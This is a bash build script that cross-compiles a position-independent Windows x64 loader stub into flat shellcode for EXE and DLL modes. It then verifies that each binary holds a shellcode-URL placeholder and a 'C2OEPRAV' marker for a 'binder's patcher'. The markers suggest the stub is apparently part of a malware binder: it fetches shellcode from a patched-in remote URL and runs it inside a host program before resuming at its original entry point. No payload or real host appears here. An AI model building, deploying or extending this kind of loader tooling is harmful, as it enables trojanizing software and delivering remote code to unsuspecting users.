#!/usr/bin/env bash
# Build the position-independent loader stub to flat shellcode (both entry modes).
# This is the canonical build; .github/workflows/release.yml simply invokes it.
# Requires gcc-mingw-w64-x86-64.
set -euo pipefail

CROSS=x86_64-w64-mingw32
for tool in gcc ld objcopy objdump; do
    command -v "${CROSS}-${tool}" >/dev/null 2>&1 || {
        echo "ERROR: ${CROSS}-${tool} not found. Install gcc-mingw-w64-x86-64." >&2
        exit 1
    }
done
echo "Using $(${CROSS}-gcc --version | head -1)"

mkdir -p dist

for MODE in exe dll; do
    FLAG="BUILD_FOR_$(echo "$MODE" | tr 'a-z' 'A-Z')"

    # Freestanding, no CRT, no unwind tables → position-independent object.
    ${CROSS}-gcc -c -O2 -ffreestanding -nostdlib -fno-stack-protector \
        -fno-asynchronous-unwind-tables -fno-unwind-tables \
        -D"$FLAG" -e _start stub/stub.c -o "stub-$MODE.o"

    # Relocations should be PC-relative only (verifies position independence).
    ${CROSS}-objdump -r "stub-$MODE.o" || true

    # ld warns "section below image base" because stub.ld deliberately places
    # sections from VA 0 for a flat PIC blob; the warning is expected/harmless.
    ${CROSS}-ld -T stub/stub.ld --entry=_start -o "stub-$MODE.pe" "stub-$MODE.o"
    ${CROSS}-objcopy -O binary "stub-$MODE.pe" "dist/stub-x64-$MODE.bin"
    rm stub-*.o stub-*.pe
done

# The binder's patcher needs exactly one of each ASCII marker per flat binary.
for f in dist/stub-x64-exe.bin dist/stub-x64-dll.bin; do
    test "$(grep -a -c SHELLCODE_URL_PLACEHOLDER "$f")" = 1 || { echo "FAIL ($f): URL marker missing/duplicated"; exit 1; }
    test "$(grep -a -c C2OEPRAV "$f")" = 1 || { echo "FAIL ($f): OEP marker missing/duplicated"; exit 1; }
done

echo "Built: $(ls dist/stub-x64-*.bin)"
